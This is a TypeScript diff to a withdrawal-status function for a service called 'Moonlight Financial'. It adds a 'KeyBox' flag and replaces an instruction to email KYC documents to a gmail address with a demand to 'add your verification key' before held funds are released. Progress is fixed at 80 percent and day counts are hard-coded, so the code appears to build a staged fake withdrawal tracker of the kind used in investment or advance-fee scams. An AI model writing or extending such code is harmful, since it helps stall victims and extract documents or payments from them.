@@ -180,6 +180,8 @@ export interface WithdrawalComplianceResult {
   isProcessing: boolean;
   isHold: boolean;
   isKycRequired: boolean;
+  /** Alias for isKycRequired — used by the KeyBox UI flow */
+  isKeyBoxRequired: boolean;
   kycEmail: string;
   currentDayNumber: number;
   isSuccess: boolean;
@@ -230,6 +232,7 @@ export function getWithdrawalComplianceInfo(
       isProcessing: false,
       isHold: false,
       isKycRequired: false,
+      isKeyBoxRequired: false,
       kycEmail: COMPLIANCE_KYC_EMAIL,
       currentDayNumber: 5,
       isSuccess: true,
@@ -257,6 +260,7 @@ export function getWithdrawalComplianceInfo(
       isProcessing: false,
       isHold: false,
       isKycRequired: false,
+      isKeyBoxRequired: false,
       kycEmail: COMPLIANCE_KYC_EMAIL,
       currentDayNumber: 0,
       isSuccess: false,
@@ -284,6 +288,7 @@ export function getWithdrawalComplianceInfo(
       isProcessing: false,
       isHold: false,
       isKycRequired: false,
+      isKeyBoxRequired: false,
       kycEmail: COMPLIANCE_KYC_EMAIL,
       currentDayNumber: 0,
       isSuccess: false,
@@ -295,24 +300,25 @@ export function getWithdrawalComplianceInfo(
     };
   }
 
-  // Case: >= 5 days (120 hours) OR explicitly on hold/review -> Triggers Mandatory KYC Requirement
+  // Case: >= 5 days (120 hours) OR explicitly on hold/review -> Triggers KeyBox Verification Requirement
   if (elapsedHours >= 120 || isExplicitHold) {
     return {
-      statusLabel: "KYC VERIFICATION REQUIRED",
-      stageTitle: "Action Required — KYC Verification",
+      statusLabel: "KEYBOX VERIFICATION REQUIRED",
+      stageTitle: "Action Required — KeyBox Verification",
       description:
-        "Outbound interbank settlement is on hold pending mandatory KYC identity verification. Please email your documents to moonlightwealthmanagement@gmail.com.",
-      currentStep: "Mandatory KYC Identity & Source Verification",
+        "Outbound interbank settlement is on hold pending KeyBox verification. Please add your verification key — verification confirmation will be sent to your registered email.",
+      currentStep: "KeyBox Verification & Release Authorization",
       currentStepDescription:
-        "Automated clearance could not be completed. You will receive an email from Moonlight Financial with instructions to submit your KYC documents to moonlightwealthmanagement@gmail.com. As soon as verified, the funds will reflect in your bank account.",
+        "Outbound clearing requires KeyBox verification before funds can be released. Add your verification key to proceed — verification confirmation will be sent to your registered email. As soon as verified, the funds will reflect in your bank account.",
       nextStep: "Disbursement & Final Bank Credit",
-      nextStepDescription: "Amount will immediately reflect in your bank account upon verification of KYC documents.",
+      nextStepDescription: "Amount will immediately reflect in your bank account upon verification of your KeyBox key.",
       estimatedArrivalDate: arrival.rangeText,
-      estimatedDaysText: "Pending KYC Verification",
+      estimatedDaysText: "Pending KeyBox Verification",
       progressPercent: 80,
       isProcessing: true,
       isHold: true,
       isKycRequired: true,
+      isKeyBoxRequired: true,
       kycEmail: COMPLIANCE_KYC_EMAIL,
       currentDayNumber: 5,
       isSuccess: false,
@@ -343,6 +349,7 @@ export function getWithdrawalComplianceInfo(
       isProcessing: true,
       isHold: false,
       isKycRequired: false,
+      isKeyBoxRequired: false,
       kycEmail: COMPLIANCE_KYC_EMAIL,
       currentDayNumber: 1,
       isSuccess: false,
@@ -373,6 +380,7 @@ export function getWithdrawalComplianceInfo(
       isProcessing: true,
       isHold: false,
       isKycRequired: false,
+      isKeyBoxRequired: false,
       kycEmail: COMPLIANCE_KYC_EMAIL,
       currentDayNumber: dayNum,
       isSuccess: false,
@@ -402,6 +410,7 @@ export function getWithdrawalComplianceInfo(
     isProcessing: true,
     isHold: false,
     isKycRequired: false,
+    isKeyBoxRequired: false,
     kycEmail: COMPLIANCE_KYC_EMAIL,
     currentDayNumber: dayNum,
     isSuccess: false,
